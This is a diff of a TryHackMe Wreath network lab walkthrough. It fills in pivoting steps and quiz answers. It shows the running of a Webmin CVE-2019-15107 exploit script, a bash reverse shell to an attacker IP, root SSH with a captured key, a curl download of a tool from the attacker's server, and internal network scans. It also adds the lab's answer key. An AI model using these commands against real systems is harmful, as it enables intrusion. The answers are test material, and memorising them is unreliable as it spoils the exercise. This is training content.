@@ -20,7 +20,7 @@ nmap -A $VICTIM
 nmap -sV -sT -O -p 1-65535 $VICTIM
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -40,7 +40,7 @@ chmod +x ./CVE-2019-15107.py
 ./CVE-2019-15107.py $VICTIM
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -55,7 +55,7 @@ bash -i >& /dev/tcp/$KALI/4444 0>&1
 bash -i >& /dev/tcp/10.50.86.117/4444 0>&1
 ```
 
-<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Victim**
 
@@ -107,7 +107,7 @@ ssh -i id_rsa root@$VICTIM
 arp -a 
 ```
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 **Victim**
 
@@ -116,7 +116,7 @@ cat /etc/hosts
 cat /etc/resolv.conf
 ```
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Victim**
 
@@ -124,7 +124,7 @@ cat /etc/resolv.conf
 nmcli dev show 
 ```
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Victim**
 
@@ -132,7 +132,7 @@ nmcli dev show
 for i in {1..255}; do (ping -c 1 10.200.85.${i} | grep "bytes from" &); done
 ```
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Victim**
 
@@ -848,16 +848,45 @@ On Kali (inside the directory containing your Nmap binary):
 
 `sudo python3 -m http.server 80`
 
+
+
+**Kali**
+
+```
+sudo python3 -m http.server 82
+```
+
 Then, on the target:
 
-`curl ATTACKING_IP/nmap-USERNAME -o /tmp/nmap-USERNAME && chmod +x /tmp/nmap-USERNAME`\
+`curl ATTACKING_IP/nmap-USERNAME -o /tmp/nmap-USERNAME && chmod +x /tmp/nmap-USERNAME`
 
+**Victim**
+
+```
+curl http://$KALI:82/nmap -o /tmp/nmap-USERNAME && chmod +x /tmp/nmap-USERNAME
+
+curl http://10.50.86.117:82/nmap -o /tmp/nmap-FFEJ && chmod +x /tmp/nmap-FFEJ
+
+```
 
 ![Using cURL and a Python HTTP server to upload nmap to the target](https://assets.tryhackme.com/additional/wreath-network/f621bb960163.png)
 
 Now use the binary to scan the network. The command will look something like this:
 
 `./nmap-USERNAME -sn 10.x.x.1-255 -oN scan-USERNAME`
+
+
+
+**Victim**
+
+```
+ip
+./nmap-FFEJ -sn 10.200.85.1-255 -oN scan-FFEJ
+```
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+
 
 You will need to substitute in your username, and the correct IP range. For example:
 
@@ -878,7 +907,7 @@ _Note: The host ending in_ `.250` _is the OpenVPN server, and should be excluded
 **Excluding the out of scope hosts, and the current host (`.200`), how many hosts were discovered active on the network?**
 
 ```
-// Some code
+2
 ```
 
 
@@ -886,21 +915,35 @@ _Note: The host ending in_ `.250` _is the OpenVPN server, and should be excluded
 **In ascending order, what are the last octets of these host IPv4 addresses? (e.g. if the address was 172.16.0.80, submit the 80)**
 
 ```
-/
+100,150
 ```
 
 **Scan the hosts -- which one does&#x20;**_**not**_**&#x20;return a status of "filtered" for every port (submit the last octet only)?**
 
+**Kali**
+
 ```
-/
+./nmap-FFEJ -sS 10.200.85.150 -T5 -oN 150.txt
 ```
 
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
+**Kali**
+
+```
+./nmap-FFEJ -sS 10.200.85.100 -T5 -oN 150.txt
+```
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+```
+150
+```
 
 **Let's assume that the other host is inaccessible from our current position in the network. Which TCP ports (in ascending order, comma separated) below port 15000, are open on the remaining target?**
 
 ```
-/
+80,3389,5985
 ```
 
 **We cannot currently perform a service detection scan on the target without first setting up a proxy, so for the time being, let's assume that the services Nmap has identified based on their port number are accurate. (Please feel free to experiment with other scan types through a proxy after completing the pivoting section).**
@@ -908,7 +951,7 @@ _Note: The host ending in_ `.250` _is the OpenVPN server, and should be excluded
 **Assuming that the service guesses made by Nmap are accurate, which of the found services is more likely to contain an exploitable vulnerability?**
 
 ```
-/
+HTTP
 ```
 
 
